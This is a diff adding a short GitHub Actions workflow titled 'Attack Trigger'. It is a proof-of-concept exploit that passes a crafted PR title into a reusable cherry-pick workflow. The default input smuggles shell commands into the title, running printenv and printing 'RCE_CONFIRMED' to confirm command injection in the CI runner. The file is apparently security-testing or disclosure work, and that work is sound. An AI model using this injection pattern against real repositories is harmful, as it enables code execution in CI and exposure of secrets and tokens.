@@ -1,0 +1,15 @@
+name: Attack Trigger
+
+on:
+  workflow_dispatch:
+    inputs:
+      malicious_title:
+        description: 'Input your malicious payload here'
+        required: true
+        default: 'Normal Title"; printenv | grep GITHUB_ACTOR; echo "RCE_CONFIRMED"; #'
+
+jobs:
+  trigger-exploit:
+    uses: ./.github/workflows/cherry-pick-single.yml
+    with:
+      pr_title: ${{ inputs.malicious_title }}
